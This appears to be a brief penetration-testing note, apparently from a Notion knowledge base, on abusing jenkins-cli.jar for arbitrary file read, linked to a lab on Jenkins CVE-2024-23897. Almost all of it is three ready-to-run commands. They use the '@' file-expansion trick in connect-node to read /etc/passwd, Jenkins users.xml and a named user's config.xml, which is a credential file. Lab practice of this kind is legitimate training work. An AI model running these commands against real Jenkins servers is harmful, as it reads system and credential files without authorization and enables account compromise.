# jenkins-cli LFI

OS: Linux
Description: Abuse jenkins-cli.jar
Security Domains: Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21)
Target_Technology: Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)

```jsx
java -jar jenkins-cli.jar -s http://location_of_server:8080 connect-node '@/etc/passwd'
```

```jsx
java -jar jenkins-cli.jar -s http://location_of_server:8080 connect-node '@/var/jenkins_home/users/users.xml'
```

```jsx
java -jar jenkins-cli.jar -s http://location_of_server:8080 connect-node '@/var/jenkins_home/users/kylereese_12022439290147957862/config.xml'
```

Related Lab:

[https://humble-raptor-f30.notion.site/Breach-the-Build-Exploiting-Jenkins-CVE-2024-23897-e08f7f116f064ce1a283d1e67991262d?pvs=4](https://www.notion.so/Breach-the-Build-Exploiting-Jenkins-CVE-2024-23897-e08f7f116f064ce1a283d1e67991262d?pvs=21)